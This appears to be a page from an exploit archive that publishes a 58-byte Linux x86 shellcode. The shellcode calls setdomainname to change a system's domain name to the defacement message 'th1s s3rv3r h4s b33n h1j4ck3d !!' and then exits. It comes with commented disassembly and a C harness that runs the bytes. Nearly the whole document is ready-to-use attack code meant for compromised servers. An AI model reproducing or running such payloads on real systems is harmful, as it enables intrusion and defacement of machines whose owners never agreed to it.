<html><head><title>Linux/x86 - setdomainname to (th1s s3rv3r h4s b33n h1j4ck3d !!)</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_&lt;_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ &gt;&gt; Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : setdomainname to &quot;th1s s3rv3r h4s b33n h1j4ck3d !!&quot;
Name   : 58 bytes sys_setdomainname (&quot;th1s s3rv3r h4s b33n h1j4ck3d !!&quot;) x86 linux shellcode
Date   : Wed Jun  2 19:57:34 2010
Author : gunslinger_ &lt;yudha.gunslinger[at]gmail.com&gt;
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
greetz to : flyff666, mywisdom, kiddies, petimati, ketek, whitehat, and all devilzc0de family 
*/
#include &lt;stdio.h&gt;

char *shellcode=
		&quot;\xeb\x13&quot;                    /* jmp    0x8048075 */
		&quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
		&quot;\xb0\x79&quot;                    /* mov    $0x79,%al */
		&quot;\x5b&quot;                        /* pop    %ebx */
		&quot;\x31\xc9&quot;                    /* xor    %ecx,%ecx */
		&quot;\xb1\x20&quot;                    /* mov    $0x20,%cl */
		&quot;\xcd\x80&quot;                    /* int    $0x80 */
		&quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
		&quot;\xb0\x01&quot;                    /* mov    $0x1,%al */
		&quot;\x31\xdb&quot;                    /* xor    %ebx,%ebx */
		&quot;\xcd\x80&quot;                    /* int    $0x80 */
		&quot;\xe8\xe8\xff\xff\xff&quot;        /* call   0x8048062 */
		&quot;\x74\x68&quot;                    /* je     0x80480e4 */
		&quot;\x31\x73\x20&quot;                /* xor    %esi,0x20(%ebx) */
		&quot;\x73\x33&quot;                    /* jae    0x80480b4 */
		&quot;\x72\x76&quot;                    /* jb     0x80480f9 */
		&quot;\x33\x72\x20&quot;                /* xor    0x20(%edx),%esi */
		&quot;\x68\x34\x73\x20\x62&quot;        /* push   $0x62207334 */
		&quot;\x33\x33&quot;                    /* xor    (%ebx),%esi */
		&quot;\x6e&quot;                        /* outsb  %ds		&quot;(%esi),(%dx) */
		&quot;\x20\x68\x31&quot;                /* and    %ch,0x31(%eax) */
		&quot;\x6a\x34&quot;                    /* push   $0x34 */
		&quot;\x63\x6b\x33&quot;                /* arpl   %bp,0x33(%ebx) */
		&quot;\x64\x20\x21&quot;                /* and    %ah,%fs		&quot;(%ecx) */
		&quot;\x21&quot;;                        /* .byte 0x21 */

int main(void)
{
		fprintf(stdout,&quot;Length: %d\n&quot;,strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
